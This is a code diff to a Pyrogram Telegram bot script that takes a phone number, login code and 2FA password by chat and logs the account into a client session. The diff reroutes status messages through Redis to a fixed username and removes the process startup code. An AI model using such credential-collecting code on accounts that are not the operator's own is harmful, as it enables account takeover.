@@ -4,6 +4,7 @@ from pyrogram.types.messages_and_media import message
 from multiprocessing import Process
 from config import Config
 from redis import Redis
+from time import sleep
 import asyncio
 
 config = Config()
@@ -21,7 +22,7 @@ class StateManager(Client):
         pass
 
     def start_session(self, phone_number):
-        self.app = Client('test', self.api_id, self.api_hash)
+        self.app = Client('test_second', self.api_id, self.api_hash)
         self.app.connect()
         self.phone = phone_number
         self.code_hash = self.app.send_code(self.phone).phone_code_hash
@@ -60,6 +61,8 @@ def msg_agent():
                 bot.send_message('@{}'.format(msg[b'id'].decode('UTF-8')), msg[b'text'].decode('UTF-8'))
                 redis.delete('msg')
 
+            sleep(0.1)
+
 
 def handlers():
     redis = Redis()
@@ -79,10 +82,10 @@ def handlers():
             phone_number = msg.text
             print('number {}'.format(phone_number))
             state_m.start_session(phone_number)
-            bot.send_message(msg.from_user.id, "Номер принят")
-            bot.send_message(msg.from_user.id, "Введите код")
+            redis.hmset('msg', {"id": "WhileForInt", "text": "Номер принят"})
+            sleep(0.5)
+            redis.hmset('msg', {"id": "WhileForInt", "text": "Введите код"})
             state_m.make_state('wait_for_code')
-            bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
 
 
     @bot.on_message(~filters.me, group=1)
@@ -92,14 +95,14 @@ def handlers():
             code = msg.text
 
             if state_m.enter_code(code):
-                bot.send_message(msg.from_user.id, "Код принят")
-                bot.send_message(msg.from_user.id, "Аккаунт добавлен")
-                bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
+                redis.hmset('msg', {"id": "WhileForInt", "text": "Код принят"})
+                sleep(0.5)
+                redis.hmset('msg', {"id": "WhileForInt", "text": "Аккаунт добавлен"})
             else:
                 state_m.make_state('wait_for_2fa')
-                bot.send_message(msg.from_user.id, "Код принят")
-                bot.send_message(msg.from_user.id, "Введите 2fa")
-                bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
+                redis.hmset('msg', {"id": "WhileForInt", "text": "Код принят"})
+                sleep(0.5)
+                redis.hmset('msg', {"id": "WhileForInt", "text": "Введите 2fa"})
 
 
     @bot.on_message(~filters.me, group=0)
@@ -109,18 +112,12 @@ def handlers():
             tfa = msg.text
 
             state_m.enter_2fa(tfa)
-            bot.send_message(msg.from_user.id, "Аккаунт добавлен")
-            bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
+            redis.hmset('msg', {"id": "WhileForInt", "text": "Аккаунт добавлен"})
 
     state_m.make_one(False)
 
     bot.run()
 
-msg_agent = Process(target=msg_agent, args=())
-handlers = Process(target=handlers, args=())
-handlers.start()
-msg_agent.start()
-handlers.join()
-msg_agent.join()
+
 
 print('Pyro started')
